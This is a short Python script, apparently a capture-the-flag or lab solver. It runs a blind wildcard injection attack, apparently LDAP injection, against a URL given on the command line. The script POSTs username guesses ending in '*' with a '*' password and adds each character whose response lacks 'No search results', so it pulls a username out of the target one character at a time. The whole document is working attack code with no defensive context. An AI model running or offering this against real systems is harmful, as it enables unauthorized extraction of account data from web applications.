import requests
import argparse

characters = (
    'abcdefghijklmnopqrstuvwxyz'
    'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"
    '0123456789'
)

def send_request(url: str):
    data = {'username': '', 'password': '*'}
    result = ''
    flag = 1
    while flag == 1:
        flag = 0
        for char in characters:
            data['username'] = result + char + '*'
            response = requests.post(url, data=data)
            if 'No search results' not in response.text:
                result += char
                flag = 1
                print(result)
                break

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('url')
    args = parser.parse_args()
    url = args.url
    send_request(url)
